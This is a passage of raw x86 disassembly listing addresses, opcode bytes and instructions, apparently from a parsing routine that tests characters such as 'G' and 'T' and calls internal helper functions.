  404ff4:	89 e9                	mov    %ebp,%ecx
  404ff6:	ba 41 00 00 00       	mov    $0x41,%edx
  404ffb:	89 d8                	mov    %ebx,%eax
  404ffd:	e8 be ca ff ff       	call   0x401ac0
  405002:	e9 ab fd ff ff       	jmp    0x404db2
  405007:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40500e:	66 90                	xchg   %ax,%ax
  405010:	89 d8                	mov    %ebx,%eax
  405012:	e8 f9 fc ff ff       	call   0x404d10
  405017:	89 c1                	mov    %eax,%ecx
  405019:	e9 d9 fe ff ff       	jmp    0x404ef7
  40501e:	66 90                	xchg   %ax,%ax
  405020:	31 d2                	xor    %edx,%edx
  405022:	89 d8                	mov    %ebx,%eax
  405024:	e8 b7 07 00 00       	call   0x4057e0
  405029:	89 c1                	mov    %eax,%ecx
  40502b:	e9 e3 fd ff ff       	jmp    0x404e13
  405030:	31 f6                	xor    %esi,%esi
  405032:	e9 3d fe ff ff       	jmp    0x404e74
  405037:	ba 68 00 00 00       	mov    $0x68,%edx
  40503c:	89 d8                	mov    %ebx,%eax
  40503e:	e8 cd cc ff ff       	call   0x401d10
  405043:	85 c0                	test   %eax,%eax
  405045:	0f 84 65 fd ff ff    	je     0x404db0
  40504b:	8b 43 0c             	mov    0xc(%ebx),%eax
  40504e:	0f b6 00             	movzbl (%eax),%eax
  405051:	3c 47                	cmp    $0x47,%al
  405053:	0f 84 0d 03 00 00    	je     0x405366
  405059:	3c 54                	cmp    $0x54,%al
  40505b:	0f 84 05 03 00 00    	je     0x405366
  405061:	31 d2                	xor    %edx,%edx
  405063:	89 d8                	mov    %ebx,%eax
  405065:	e8 76 07 00 00       	call   0x4057e0
  40506a:	89 c1                	mov    %eax,%ecx
  40506c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405073:	ba 0f 00 00 00       	mov    $0xf,%edx
  405078:	89 d8                	mov    %ebx,%eax
  40507a:	e8 41 ca ff ff       	call   0x401ac0
  40507f:	e9 2e fd ff ff       	jmp    0x404db2
  405084:	31 d2                	xor    %edx,%edx
  405086:	89 d8                	mov    %ebx,%eax
  405088:	e8 83 cc ff ff       	call   0x401d10
  40508d:	85 c0                	test   %eax,%eax
  40508f:	0f 84 1b fd ff ff    	je     0x404db0
  405095:	31 d2                	xor    %edx,%edx
  405097:	89 d8                	mov    %ebx,%eax
  405099:	e8 72 cc ff ff       	call   0x401d10
  40509e:	85 c0                	test   %eax,%eax
  4050a0:	0f 84 0a fd ff ff    	je     0x404db0
  4050a6:	8b 43 0c             	mov    0xc(%ebx),%eax
  4050a9:	0f b6 00             	movzbl (%eax),%eax
  4050ac:	3c 47                	cmp    $0x47,%al
  4050ae:	0f 84 cb 02 00 00    	je     0x40537f
  4050b4:	3c 54                	cmp    $0x54,%al
  4050b6:	0f 84 c3 02 00 00    	je     0x40537f
  4050bc:	31 d2                	xor    %edx,%edx
  4050be:	89 d8                	mov    %ebx,%eax
  4050c0:	e8 1b 07 00 00       	call   0x4057e0
  4050c5:	89 c1                	mov    %eax,%ecx
  4050c7:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4050ce:	ba 11 00 00 00       	mov    $0x11,%edx
  4050d3:	89 d8                	mov    %ebx,%eax
  4050d5:	e8 e6 c9 ff ff       	call   0x401ac0
  4050da:	e9 d3 fc ff ff       	jmp    0x404db2
  4050df:	31 d2                	xor    %edx,%edx
  4050e1:	89 d8                	mov    %ebx,%eax
  4050e3:	e8 a8 02 00 00       	call   0x405390
  4050e8:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4050ef:	ba 15 00 00 00       	mov    $0x15,%edx
  4050f4:	89 c1                	mov    %eax,%ecx
  4050f6:	89 d8                	mov    %ebx,%eax
  4050f8:	e8 c3 c9 ff ff       	call   0x401ac0
  4050fd:	e9 b0 fc ff ff       	jmp    0x404db2
  405102:	83 c1 0f             	add    $0xf,%ecx
  405105:	89 d8                	mov    %ebx,%eax
  405107:	89 4b 2c             	mov    %ecx,0x2c(%ebx)
  40510a:	e8 f1 d7 ff ff       	call   0x402900
  40510f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405116:	ba 09 00 00 00       	mov    $0x9,%edx
